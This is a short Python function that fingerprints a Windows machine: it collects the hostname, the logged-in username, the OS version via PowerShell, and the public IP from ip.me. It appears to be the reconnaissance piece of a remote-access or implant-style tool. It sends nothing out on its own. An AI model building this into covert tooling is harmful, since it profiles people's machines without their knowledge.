import os
import re
import socket
import requests
import subprocess
import win32api


VERSION_PATTERN = r"Windows .*"


def enum_windows():
    os_version = subprocess.check_output(["powershell", "-c", "Get-ComputerInfo | select WindowsProductName"],
                                         shell=True)
    try:
        os_version = re.findall(VERSION_PATTERN, os_version.decode())[0].strip()
    except IndexError:
        os_version = "No fucking clue"
    try:
        return {"hostname": socket.gethostname(), "ip": requests.get("http://ip.me").text.strip(), "user": os.getlogin(), "os-version": os_version}
    except:
        return {"hostname": socket.gethostname(), "ip": "Unable to determine IP", "user": os.getlogin(), "os-version": os_version}